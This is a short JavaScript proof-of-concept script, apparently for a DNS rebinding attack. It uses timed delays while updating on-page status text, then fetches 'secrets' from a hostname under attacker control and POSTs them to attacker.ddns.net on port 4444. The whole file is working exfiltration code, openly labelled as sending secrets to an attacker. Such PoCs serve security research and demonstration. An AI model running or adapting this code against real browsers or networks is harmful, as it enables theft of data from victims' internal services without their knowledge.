console.log("Executing");

setTimeout(function () {
	$('#updates').text(function(i, oldText) {
		return "30 seconds have passed";
	});

	setTimeout(function () {
		$('#updates').text(function(i, oldText) {
			return "1 minute has passed";
		});

		setTimeout(function () {
			$('#updates').text(function(i, oldText) {
				return "1m30s has passed";
			});

			setTimeout(function () {
				$('#actions').text(function(i, oldText) {
					return "Making a GET request to retreive the secrets";
				});
				$('#updates').text(function(i, oldText) {
					return "Sending the secrets to the attacker";
				});

				$.get("http://psdnspoc.hopto.org/", function (data) {
					console.log(data);

					$.post("http://attacker.ddns.net:4444/", data).done(function (res) {
						console.log(res);
					});

				})


			}, 30 * 1000);

		}, 30 * 1000);

	}, 30 * 1000);

}, 1000 * 30);
